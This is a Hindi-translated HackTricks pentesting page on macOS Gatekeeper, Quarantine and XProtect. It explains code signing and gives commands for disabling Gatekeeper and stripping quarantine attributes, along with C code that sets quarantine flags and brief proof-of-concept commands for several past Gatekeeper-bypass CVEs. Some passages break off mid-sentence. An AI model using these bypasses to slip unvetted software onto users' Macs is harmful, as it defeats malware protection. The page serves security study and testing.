# macOS Gatekeeper / Quarantine / XProtect

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी को हैकट्रिक्स में विज्ञापित** किया जाए? या क्या आप **PEASS के नवीनतम संस्करण देखना चाहते हैं या हैकट्रिक्स को पीडीएफ में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**एनएफटी**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS और हैकट्रिक्स स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर पर फॉलो** करें **🐦**[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स रेपो** में पीआर जमा करके [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को फॉलो** करें।
*
* .

</details>

## Gatekeeper

**गेटकीपर** एक सुरक्षा सुविधा है जो मैक ऑपरेटिंग सिस्टम के लिए विकसित की गई है, जिसका उद्देश्य यह सुनिश्चित करना है कि उपयोगकर्ता उनके सिस्टम पर **केवल विश्वसनीय सॉफ़्टवेयर चलाएं**। यह उपयोगकर्ता द्वारा डाउनलोड किया और खोलने का प्रयास किया गया सॉफ़्टवेयर **जैसे कि एक ऐप, एक प्लग-इन, या एक इंस्टॉलर पैकेज** से **बाहरी स्रोतों से** को मान्यता देने के रूप में कार्य करता है।

गेटकीपर की मुख्य तंत्रिका उसकी **सत्यापन** प्रक्रिया में है। यह यह जांचता है कि डाउनलोड किया गया सॉफ़्टवेयर **किसी मान्यता प्राप्त डेवलपर द्वारा साइन किया गया है**, सुनिश्चित करते हुए कि सॉफ़्टवेयर की प्रामाणिकता है। इसके अतिरिक्त, यह सुनिश्चित करता है कि क्या सॉफ़्टवेयर **एप्पल द्वारा नोटराइज़्ड** है, जिससे साबित होता है कि इसमें किसी जाने-माने हानिकारक सामग्री की कमी है और नोटराइज़ेशन के बाद इसमें हस्तक्षेप नहीं किया गया है।

इसके अतिरिक्त, गेटकीपर उपयोगकर्ता नियंत्रण और सुरक्षा को मजबूत करने के लिए डाउनलोड किए गए सॉफ़्टवेयर को खोलने की **मंजूरी देने के लिए उपयोगकर्ताओं को प्रोत्साहित** करता है। यह सुरक्षा उपाय उपयोगकर्ताओं को अनजाने में किसी हानिकारक एक्झीक्यूटेबल कोड को चलाने से रोकने में मदद करता है जिसे वे किसी अहानिकारक डेटा फ़ाइल के रूप में गलती से समझ सकते हैं।

### एप्लिकेशन हस्ताक्षर

एप्लिकेशन हस्ताक्षर, जिसे कोड हस्ताक्षर भी कहा जाता है, एप्पल की सुरक्षा बुनियाद का एक महत्वपूर्ण घटक है। इसका उपयोग किया जाता है **सॉफ़्टवेयर लेखक की पहचान सत्यापित** करने के लिए (डेवलपर) और सुनिश्चित करने के लिए कि कोड उस समय से जब आखिरी बार साइन किया गया था, उसके बाद से न ही खिसका है।

यह कैसे काम करता है:

1. **एप्लिकेशन को साइन करना:** जब एक डेवलपर अपने एप्लिकेशन को वितरित करने के लिए तैयार होता है, तो वह **एप्लिकेशन को एक निजी कुंजी का उपयोग करके साइन करता है**। यह निजी कुंजी उस सर्टिफिकेट से संबंधित है जिसे एप्पल डेवलपर प्रोग्राम में डेवलपर को जब वह एप्पल डेवलपर प्रोग्राम में नामांकित होते हैं, तो एप्पल जारी करता है। साइनिंग प्रक्रिया में एप्लिकेशन के सभी हिस्सों का एक क्रिप्टोग्राफिक हैश बनाना और इस हैश को डेवलपर की निजी कुंजी के साथ एन्क्रिप्ट करना शामिल है।
2. **एप्लिकेशन को वितरित करना:** साइन किए गए एप्लिकेशन को उपयोगकर्ताओं के साथ डेवलपर के सर्टिफिकेट के साथ वितरित किया जाता है, जिसमें संबंधित पब्लिक कुंजी होती है।
3. **एप्लिकेशन की सत्यापन:** जब एक उपयोगकर्ता एप्लिकेशन को डाउनलोड करता है और चलाने का प्रयास करता है, तो उनका मैक ऑपरेटिंग सिस्टम डेवलपर के सर्टिफिकेट से पब्लिक कुंजी का उपयोग करके हैश को डिक्रिप्ट करता है। फिर यह हैश को वर्तमान एप्लिकेशन की स्थिति पर आधारित हैश पुनः गणना करता है और इसे डिक्रिप्ट किए गए हैश के साथ तुलना करता है। यदि वे मिलते हैं, तो इसका मतलब है कि **एप्लिकेशन में कोई परिवर्तन नहीं** किया गया है जब से डेवलपर ने इसे साइन किया था, और सिस्टम एप्लिकेशन को चलाने की अनुमति देता है।

एप्लिकेशन हस्ताक्षर एप्पल के गेटकीपर प्रौद्योगिकी का एक महत्वपूर्ण हिस्सा है। जब एक उपयोगकर्ता **इंटरनेट से डाउनलोड किए गए एप्लिकेशन को खोलने का प्रयास करता है**, तो गेटकीपर एप्लिकेशन हस्ताक्षर की सत्यापन करता है। यदि यह एप्पल द्वारा एक जाने-माने डेवलपर को जारी किए गए सर्टिफिकेट के साथ साइन किया गया है और कोड में कोई हस्तक्षेप नहीं किया गया है, तो गेटकीपर एप्लिकेशन को चलाने की अनुमति देता है। अन्यथा, यह एप्लिकेशन को ब्लॉक करता है और उपयोगकर्ता को सूचित करता है।

मैकओएस कैटालिना से शुरू होकर, **गेटकीपर यह भी जांचता है कि क्या एप्लिकेशन को एप्पल द्वारा नोटराइज़्ड** किया गया है, जो एक अतिरिक्त सुरक्षा स्तर जोड़ता है। नोटराइज़ेशन प्रक्रिया एप्लिकेशन को जाने-माने सुरक्षा समस्याओं और हानिकारक कोड के लिए जांचती है, और यदि ये जांचें पास होती ह
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### नोटराइजेशन

एप्पल की नोटराइजेशन प्रक्रिया उपयोगकर्ताओं को संभावित हानिकारक सॉफ्टवेयर से सुरक्षित रखने के लिए एक अतिरिक्त सुरक्षा प्रणाली के रूप में काम करती है। इसमें **डेवलपर अपने एप्लिकेशन को एप्पल की नोटरी सेवा** के द्वारा **जांच के लिए प्रस्तुत** करता है, जिसे एप्प रिव्यू से भिन्न नहीं किया जाना चाहिए। यह सेवा एक **स्वचालित प्रणाली** है जो प्रस्तुत सॉफ्टवेयर को **हानिकारक सामग्री** और कोड-साइनिंग के साथ किसी भी संभावित मुद्दों के लिए जांचती है।

यदि सॉफ्टवेयर **इस जांच में सफलता प्राप्त** करता है और कोई चिंता नहीं उठाता है, तो नोटरी सेवा एक नोटराइजेशन टिकट उत्पन्न करती है। उसके बाद डेवलपर को चाहिए कि वे इस टिकट को अपने सॉफ्टवेयर के साथ **जोड़ें**, जिसे 'स्टैप्लिंग' कहा जाता है। इसके अतिरिक्त, नोटराइजेशन टिकट को भी ऑनलाइन प्रकाशित किया जाता है जहां गेटकीपर, एप्पल की सुरक्षा प्रौद्योगिकी, इसे एक्सेस कर सकती है।

उपयोगकर्ता के पहले सॉफ्टवेयर के स्थापना या अभिव्यक्ति पर, नोटराइजेशन टिकट की मौजूदगी - चाहे वह एक्जीक्यूटेबल के साथ स्टैपल किया गया हो या ऑनलाइन मिला हो - गेटकीपर को सूचित करती है कि सॉफ्टवेयर को एप्पल द्वारा नोटराइज़ किया गया है। इस परिणामस्वरूप, गेटकीपर प्रारंभिक लॉन्च संवाद में एक विवरणात्मक संदेश प्रदर्शित करता है, जिसमें यह उल्लेख किया जाता है कि सॉफ्टवेयर को एप्पल द्वारा हानिकारक सामग्री की जांच के लिए जांचा गया है। इस प्रक्रिया से उपयोगकर्ता अपने सिस्टम पर स्थापित या चलाए जाने वाले सॉफ्टवेयर की सुरक्षा में आत्मविश्वास को बढ़ाता है।

### गेटकीपर की गणना

गेटकीपर एक साथ **कई सुरक्षा घटक** है जो अविश्वसनीय ऐप्स को निषेधित होने से रोकते हैं और यह भी **उनमें से एक घटक** है।

गेटकीपर की **स्थिति** देखना संभव है:
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
ध्यान दें कि GateKeeper हस्ताक्षर जांच केवल **क्वारंटाइन विशेषता वाले फ़ाइलों** के लिए की जाती है, हर फ़ाइल के लिए नहीं।
{% endhint %}

GateKeeper यह जांचेगा कि **प्राथमिकताओं और हस्ताक्षर** के अनुसार क्या एक बाइनरी क्रियान्वित किया जा सकता है:

<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

इस विन्यास को रखने वाला डेटाबेस **`/var/db/SystemPolicy`** में स्थित है। आप इस डेटाबेस को रूट के रूप में निम्नलिखित से जांच सकते हैं:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
नोट करें कि पहला नियम "**App Store**" में समाप्त हुआ था और दूसरा "**Developer ID**" में और पिछली छवियों में यह **App Store और पहचानी गए डेवलपर्स से ऐप्स को क्रियान्वित करने की** अनुमति थी।\
अगर आप उस सेटिंग को App Store पर **संशोधित** करते हैं, तो "**Notarized Developer ID" नियम हट जाएंगे**।

**GKE प्रकार** के हजारों नियम भी हैं:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
ये हैश हैं जो **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** और **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`** से आते हैं

या आप पिछली जानकारी को निम्नलिखित के साथ सूचीबद्ध कर सकते हैं:
```bash
sudo spctl --list
```
विकल्प **`--master-disable`** और **`--global-disable`** का उपयोग करके **`spctl`** पूरी तरह से इन हस्ताक्षर जांचों को **अक्षम** कर देगा:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
जब पूरी तरह से सक्षम हो जाए, तो एक नया विकल्प दिखाई देगा:

<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

यह **जांचने की संभावना है कि क्या गेटकीपर द्वारा किसी ऐप को अनुमति दी जाएगी** के साथ किया जा सकता है:
```bash
spctl --assess -v /Applications/App.app
```
**Gatekeeper में नए नियम जोड़ना संभव है जिससे कुछ ऐप्स को निष्पादित करने की अनुमति मिले:**
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### फ़ाइलों को क्वारंटाइन करें

एक **एप्लिकेशन या फ़ाइल को डाउनलोड** करने पर, विशिष्ट macOS **एप्लिकेशन** जैसे वेब ब्राउज़र या ईमेल क्लाइंट्स **डाउनलोड की गई फ़ाइल के साथ एक विस्तारित फ़ाइल गुणवत्ता** को जोड़ते हैं, जिसे सामान्यत: "**क्वारंटाइन फ़्लैग**" के रूप में जाना जाता है। यह गुणवत्ता फ़ाइल को एक सुरक्षा उपाय के रूप में **चिह्नित करती है** कि यह अविश्वसनीय स्रोत (इंटरनेट) से आ रही है, और संभावित जोखिम ले सकती है। हालांकि, सभी एप्लिकेशन इस गुणवत्ता को नहीं जोड़ते, उदाहरण के लिए, सामान्य बिटटोरेंट क्लाइंट सॉफ़्टवेयर आम तौर पर इस प्रक्रिया को छोड़ देते हैं।

**क्वारंटाइन फ़्लैग की मौजूदगी जब एक उपयोगकर्ता फ़ाइल को निष्पादित करने का प्रयास करता है, तो macOS के गेटकीपर सुरक्षा सुविधा को संकेत करती है**।

उस स्थिति में जहां **क्वारंटाइन फ़्लैग मौजूद नहीं है** (कुछ बिटटोरेंट क्लाइंट्स के माध्यम से डाउनलोड की गई फ़ाइलों के साथ), गेटकीपर की **जांचें संपन्न नहीं की जा सकती हैं**। इसलिए, उपयोगकर्ताओं को सावधानी बरतनी चाहिए जब वे कम सुरक्षित या अज्ञात स्रोतों से डाउनलोड की गई फ़ाइलें खोलते हैं।

{% hint style="info" %}
कोड हस्ताक्षरों की **मान्यता** की **जांच** एक **संसाधन-प्रवृत्त** प्रक्रिया है जिसमें कोड और उसके सभी संगठित संसाधनों के एन्क्रिप्टेड **हैश** उत्पन्न किए जाते हैं। इसके अतिरिक्त, प्रमाणपत्र की मान्यता की जांच में यह देखना शामिल है कि उसे जारी किए जाने के बाद रद्द किया गया है या नहीं। इन कारणों के लिए, हर बार जब एक ऐप लॉन्च किया जाता है, पूर्ण कोड हस्ताक्षर और नोटराइजेशन जांच **अव्यावहारिक है**।

इसलिए, ये जांचें **केवल उस समय चलाई जाती हैं जब किसी ऐप को क्वारंटाइन गुणवत्ता के साथ निष्पादित किया जाता है**।
{% endhint %}

{% hint style="warning" %}
यह गुणवत्ता **फ़ाइल बनाने/डाउनलोड करने वाले एप्लिकेशन द्वारा सेट की जानी चाहिए**।

हालांकि, सैंडबॉक्स में फ़ाइलें जो हैं, उनके द्वारा बनाई गई हर फ़ाइल के लिए यह गुणवत्ता सेट की जाएगी। और गैर सैंडबॉक्स ऐप्स इसे खुद सेट कर सकते हैं, या **Info.plist** में [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) कुंजी को निर्दिष्ट कर सकते हैं जिससे सिस्टम `com.apple.quarantine` विस्तारित गुणवत्ता को फ़ाइलों पर सेट कर देगा।
{% endhint %}

इसकी स्थिति की **जांच करना और सक्षम/अक्षम** (रूट की आवश्यकता है) संभव है:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
आप निम्नलिखित के साथ **यह भी पता लगा सकते हैं कि क्या एक फ़ाइल के पास क्वारंटाइन विस्तारित विशेषता है**:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
विस्तारित गुणों की **मान** की **मूल्य** जांचें और यह जानने के लिए कि कौरंटाइन गुण किस ऐप ने लिखा है:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
वास्तव में एक प्रक्रिया "उस फ़ाइल पर क्वारंटीन झंडे सेट कर सकती है जिसे वह बनाती है" (मैंने एक बनाई गई फ़ाइल में USER\_APPROVED झंडा लगाने का प्रयास किया लेकिन यह लागू नहीं होता): 

<details>

<summary>स्रोत कोड क्वारंटीन झंडे लागू करें</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

और उस गुण को **हटाएं** :
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
और सभी quarantine फ़ाइलें खोजें:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

क्वारंटाइन जानकारी भी **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`** में LaunchServices द्वारा प्रबंधित एक केंद्रीय डेटाबेस में संग्रहित होती है।

#### **Quarantine.kext**

कर्नेल एक्सटेंशन केवल **सिस्टम पर कर्नेल कैश के माध्यम से** उपलब्ध है; हालांकि, आप **https://developer.apple.com/** से कर्नेल डीबग किट डाउनलोड कर सकते हैं, जिसमें एक सिम्बोलिकेटेड संस्करण शामिल होगा।

### XProtect

XProtect macOS में एक निर्देशित **एंटी-मैलवेयर** सुविधा है। XProtect **जाना मालवेयर और असुरक्षित फ़ाइल प्रकारों के डेटाबेस के खिलाफ किसी भी एप्लिकेशन की जांच करता है जब यह पहली बार लॉन्च किया जाता है या संशोधित किया जाता है**। जब आप किसी फ़ाइल को कुछ ऐप्स के माध्यम से जैसे Safari, Mail, या Messages के जरिए डाउनलोड करते हैं, XProtect स्वचालित रूप से फ़ाइल की जांच करता है। अगर यह अपने डेटाबेस में किसी भी जाने गए मैलवेयर से मेल खाता है, तो XProtect **फ़ाइल को चलाने से रोक देगा** और आपको खतरे के बारे में सूचित करेगा।

XProtect डेटाबेस को Apple नियमित रूप से **नए मैलवेयर परिभाषाओं के साथ अपडेट** किया जाता है, और ये अपडेट आपके Mac पर स्वचालित रूप से डाउनलोड और स्थापित किए जाते हैं। इससे यह सुनिश्चित होता है कि XProtect हमेशा नवीनतम जाने गए खतरों के साथ अप-टू-डेट है।

हालांकि, यह ध्यान देने योग्य है कि **XProtect एक पूर्ण-लक्षित एंटीवायरस समाधान नहीं है**। यह केवल निश्चित सूची के जाने गए खतरों की जांच करता है और अधिकांश एंटीवायरस सॉफ़्टवेयर की तरह ऑन-एक्सेस स्कैनिंग नहीं करता है।

आप नवीनतम XProtect अपड
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect स्थित है। SIP सुरक्षित स्थान पर **/Library/Apple/System/Library/CoreServices/XProtect.bundle** और बंडल के अंदर आप जानकारी पा सकते हैं जिसका XProtect उपयोग करता है:

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: उन cdhashes के साथ कोड को पुरानी अधिकारों की अनुमति देने देता है।
* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: BundleID और TeamID के माध्यम से लोड करने की अनुमति नहीं देने वाले प्लगइन और एक्सटेंशन की सूची या न्यूनतम संस्करण को दर्शाने वाली सूची।
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**: मैलवेयर का पता लगाने के लिए यारा नियम।
* **`XProtect.bundle/Contents/Resources/gk.db`**: ब्लॉक किए गए एप्लिकेशन और TeamIDs के हैश के साथ SQLite3 डेटाबेस।

ध्यान दें कि **`/Library/Apple/System/Library/CoreServices/XProtect.app`** में एक और ऐप है जो XProtect से संबंधित है जो Gatekeeper प्रक्रिया में शामिल नहीं है।

### गेटकीपर नहीं

{% hint style="danger" %}
ध्यान दें कि गेटकीपर **हर बार नहीं चलाया जाता** है जब आप कोई एप्लिकेशन चलाते हैं, केवल _**AppleMobileFileIntegrity**_ (AMFI) केवल **निर्वाचनीय कोड हस्ताक्षरों की पुष्टि** करेगा जब आप एक एप्लिकेशन चलाते हैं जो पहले से ही गेटकीपर द्वारा पुष्टि की गई है।
{% endhint %}

इसलिए, पहले एक एप्लिकेशन को चलाने के लिए एक ऐप को कैश करना संभव था, फिर **एप्लिकेशन के अभिलेखीय फ़ाइलों को संशोधित करना** (जैसे Electron asar या NIB फ़ाइलें) और अगर कोई अन्य सुरक्षा उपाय नहीं थे, तो एप्लिकेशन **को** **दुर्भाग्यपूर्ण** जोड़ों के साथ **चलाया** जाता था।

हालांकि, अब यह संभव नहीं है क्योंकि macOS **एप्लिकेशन बंडल के अंदर फ़ाइलों को संशोधित करने से रोकता है**। इसलिए, यदि आप [डर्टी NIB](../macos-proces-abuse/macos-dirty-nib.md) हमला करने की कोशिश करते हैं, तो आपको पाया जाएगा कि इसे उसे दुरुस्त करना संभव नहीं है क्योंकि गेटकीपर द्वारा पुष्टि करने के लिए ऐप को कैश करने के बाद, आप बंडल को संशोधित नहीं कर पाएंगे। और यदि आप उदाहरण के लिए Contents निर्देशिका का नाम NotCon में बदलते हैं (हमले में इंगित किया गया है), और फिर ऐप के मुख्य बाइनरी को चलाते हैं ताकि गेटकीपर के साथ कैश करें, तो यह एक त्रुटि उत्पन्न करेगा और नहीं चलाएगा।

## गेटकीपर बायपास

गेटकीपर को बायपास करने का कोई भी तरीका (उपयोगकर्ता को कुछ डाउनलोड करने और गेटकीपर द्वारा इसे निषेधित करने पर भी इसे चलाने में सफल होना) macOS में एक संकट माना जाता है। ये कुछ CVE हैं जिन्हें उन तकनीकों के लिए सौंपा गया था जिनसे पिछले में गेटकीपर को बायपास करने की अनुमति थी:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

यह देखा गया कि यदि **आर्काइव यूटिलिटी** का उपयोग निकालने के लिए किया जाता है, तो **886 वर्णों से अधिक रास्ते वाली फ़ाइलें** को com.apple.quarantine विस्तारित विशेषता प्राप्त नहीं होती है। यह स्थिति अनजाने में उन फ़ाइलों को **गेटकीपर की** सुरक्षा जांचों से **छलने** देती है।

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) देखें।

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

जब कोई एप्लिकेशन **Automator** के साथ बनाया जाता है, तो उसके बारे में जो जानकारी होती है कि वह क्या करने की आवश्यकता है, वह `application.app/Contents/document.wflow` में होती है न कि एक्जीक्यूटेबल में। एक्जीक्यूटेबल सिर्फ एक सामान्य Automator बाइनरी होता है जिसे **Automator Application Stub** कहा जाता है।

इसलिए, आप `application.app/Contents/MacOS/Automator\ Application\ Stub` को **एक प्रतीकात्मक लिंक के साथ अन्य Automator Application Stub की ओर पहुंच
```bash
zip -r test.app/Contents test.zip
```
अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) देखें।

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

हालांकि घटक भिन्न हैं, इस वंरुल्नरबिलिटी का शोषण पिछले वाले के बहुत ही समान है। इस मामले में हम **`application.app/Contents`** से एक Apple Archive उत्पन्न करेंगे ताकि **Archive Utility** द्वारा अनज़िप करने पर **`application.app` को क्वारंटाइन एट्रिब्यूट** न मिले।
```bash
aa archive -d test.app/Contents -o test.app.aar
```
अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) देखें।

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`** का उपयोग किसी भी व्यक्ति को एक फ़ाइल में एक गुण लिखने से रोकने के लिए किया जा सकता है:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
इसके अतिरिक्त, **AppleDouble** फ़ाइल प्रारूप एक फ़ाइल की प्रतिलिपि बनाता है जिसमें उसके ACEs शामिल होते हैं।

[**स्रोत कोड**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) में देखा जा सकता है कि ACL पाठ प्रतिनिधित्व **`com.apple.acl.text`** नामक xattr के अंदर संग्रहित है और यह डीकंप्रेस की गई फ़ाइल में ACL के रूप में सेट किया जाएगा। इसलिए, यदि आपने एक एप्लिकेशन को एक zip फ़ाइल में **AppleDouble** फ़ाइल प्रारूप के साथ संकुचित किया है जिसमें एक ACL है जो अन्य xattrs को लिखने से रोकता है... तो quarantine xattr एप्लिकेशन में सेट नहीं हुआ था:
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) की जाँच करें।

ध्यान दें कि यह AppleArchives के साथ भी उत्पन्न किया जा सकता है:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

यह पाया गया कि **Google Chrome डाउनलोड की गई फ़ाइलों पर quarantine विशेषता सेट नहीं कर रहा था** क्योंकि कुछ macOS आंतरिक समस्याओं के कारण।

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble फ़ाइल प्रारूप एक अलग फ़ाइल में फ़ाइल की विशेषताएँ स्टोर करता है जो `._` से शुरू होता है, यह macOS मशीनों के बीच फ़ाइल विशेषताएँ कॉपी करने में मदद करता है। हालांकि, एक AppleDouble फ़ाइल को डीकंप्रेस करने के बाद यह नोटिस किया गया कि `._` से शुरू होने वाली फ़ाइल को **quarantine विशेषता नहीं दी गई थी**।
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

एक फ़ाइल बना सकने की क्षमता जिसमें quarantine गुण सेट नहीं होगा, इससे **Gatekeeper को छलना संभव था।** यह ट्रिक थी **एक DMG फ़ाइल एप्लिकेशन बनाना** जिसमें AppleDouble नाम संस्करण का उपयोग करें (इसे `._` से शुरू करें) और **इस छिपी हुई** फ़ाइल के लिए एक दृश्यमान फ़ाइल को सिम लिंक के रूप में बनाएं जिसमें quarantine गुण नहीं है।\
